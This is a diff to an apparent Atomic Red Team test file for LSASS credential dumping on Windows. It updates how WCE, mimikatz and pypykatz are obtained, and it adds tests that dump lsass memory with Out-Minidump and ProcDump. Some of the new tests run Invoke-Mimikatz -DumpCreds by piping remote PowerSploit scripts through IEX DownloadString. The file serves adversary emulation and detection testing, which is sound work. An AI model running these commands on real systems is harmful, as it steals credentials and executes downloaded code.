@@ -38,7 +38,7 @@ atomic_tests:
       if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
       $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
       if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
         Expand-Archive $zippath $parentpath\wce -Force
         Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
@@ -181,8 +181,15 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
+      $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
+      $request = [System.Net.WebRequest]::Create($url)
+      $response = $request.GetResponse()
+      $realTagUrl = $response.ResponseUri.OriginalString
+      $version = $realTagUrl.split('/')[-1]
+      $fileName = 'mimikatz_trunk.zip'
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+      $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
+      Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
       Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
       New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
       Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -208,28 +215,104 @@ atomic_tests:
     Successful execution of this test will display multiple useranames and passwords/hashes to the screen.
   supported_platforms:
   - windows
-  dependency_executor_name: powershell
+  dependency_executor_name: command_prompt
   dependencies:
   - description: |
       Computer must have python 3 installed
     prereq_command: |
-      if (python --version) {exit 0} else {exit 1}
+      py -3 --version >nul 2>&1
+      exit /b %errorlevel%
     get_prereq_command: |
       echo "Python 3 must be installed manually"
   - description: |
       Computer must have pip installed
     prereq_command: |
-      if (pip3 -V) {exit 0} else {exit 1}
+      py -3 -m pip --version >nul 2>&1
+      exit /b %errorlevel%
     get_prereq_command: |
       echo "PIP must be installed manually"
   - description: |
       pypykatz must be installed and part of PATH
     prereq_command: |
-      if (cmd /c pypykatz -h) {exit 0} else {exit 1}
+      pypykatz -h >nul 2>&1
+      exit /b %errorlevel%
     get_prereq_command: |
-      pip3 install pypykatz
+      pip install pypykatz
   executor:
     command: |
       pypykatz live lsa
     name: command_prompt
+    elevation_required: true
+- name: Dump LSASS.exe Memory using Out-Minidump.ps1
+  auto_generated_guid: 6502c8f0-b775-4dbd-9193-1298f56b6781
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
+    powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
+    Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+       IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+    cleanup_command: |
+      Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+
+- name: Create Mini Dump of LSASS.exe using ProcDump
+  auto_generated_guid: 7cede33f-0acd-44ef-9774-15511300b24b
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+    ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe
+
+    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Path where resulting dump should be placed
+      type: Path
+      default: C:\Windows\Temp\lsass_dump.dmp
+    procdump_exe:
+      description: Path of Procdump executable
+      type: Path
+      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
+    prereq_command: |
+      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
+  executor:
+    command: |
+      #{procdump_exe} -accepteula -mm lsass.exe #{output_file}
+    cleanup_command: |
+      del "#{output_file}" >nul 2> nul
+    name: command_prompt
+    elevation_required: true
+- name: Powershell Mimikatz
+  auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
+  description: |
+    Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
+    If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
+    Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
+    Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_script:
+      description: URL to a remote Mimikatz script that dumps credentials
+      type: Url
+      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+  executor:
+    command: |
+      IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
+    name: powershell
     elevation_required: true
